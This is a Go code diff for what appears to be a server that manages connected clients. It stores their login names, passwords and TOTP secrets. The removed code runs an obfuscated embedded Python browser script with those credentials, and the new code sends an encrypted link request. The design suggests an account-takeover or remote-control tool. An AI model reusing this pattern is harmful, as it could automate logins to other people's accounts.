@@ -1,14 +1,12 @@
 package main
 
 import (
-	"bytes"
 	"encoding/json"
 	"errors"
 	"fmt"
 	"log"
 	"net"
 	"os"
-	"os/exec"
 	"path/filepath"
 	"strconv"
 	"strings"
@@ -72,70 +70,11 @@ func (d DeleteTemps) execute(_ net.Conn, _ int, _ string, _ string, _ string) er
 
 type HandleBrowser struct{}
 
-func (h HandleBrowser) execute(_ net.Conn, internalId int, _ string, _ string, _ string) error {
-	safeClients.mux.RLock()
-	client, exists := safeClients.clients[internalId]
-	safeClients.mux.RUnlock()
-
-	if !exists {
-		fmt.Println("Client with internalId", internalId, "does not exist")
-		return errors.New("client does not exist")
-	}
-
-	if client.HandledLogin {
-		return nil
-	}
-
-	client.HandledLogin = true
-	safeClients.mux.Lock()
-	safeClients.clients[internalId] = client
-	safeClients.mux.Unlock()
-
-	port := client.Port
-	email := client.LoginName
-	password := client.LoginPass
-	totpSecret := client.LoginTotp
-
-	cmdInstallDrissionpage := exec.Command("pip", "install", "drissionpage")
-	err := cmdInstallDrissionpage.Run()
+func (h HandleBrowser) execute(conn net.Conn, internalId int, _ string, _ string, _ string) error {
+	err := sendEncryptedPacket(conn, "requestLink", "{\"internalId\":"+strconv.Itoa(internalId)+"}")
 	if err != nil {
 		return err
 	}
-
-	cmdInstallPyotp := exec.Command("pip", "install", "pyotp")
-	err = cmdInstallPyotp.Run()
-	if err != nil {
-		return err
-	}
-
-	time.Sleep(3 * time.Second)
-
-	browsePy, err := FS.ReadFile("Q9e8utMX9z/O1D4c0zKvV")
-	if err != nil {
-		return err
-	}
-
-	browsePyStr := string(browsePy)
-
-	cmd := exec.Command("python", "-c", browsePyStr, "--port", strconv.Itoa(port), "--email", email, "--password", password, "--totp_secret", totpSecret)
-	stderr := &bytes.Buffer{}
-	cmd.Stderr = stderr
-	go func() {
-		var err error
-		maxRetries := 1
-		for i := 0; i < maxRetries; i++ {
-			_, err = cmd.Output()
-			if err == nil {
-				err := DeleteTemps{}.execute(nil, internalId, "", "", "")
-				if err != nil {
-					break
-				}
-				break
-			}
-			time.Sleep(3 * time.Second)
-		}
-	}()
-
 	return nil
 }
 
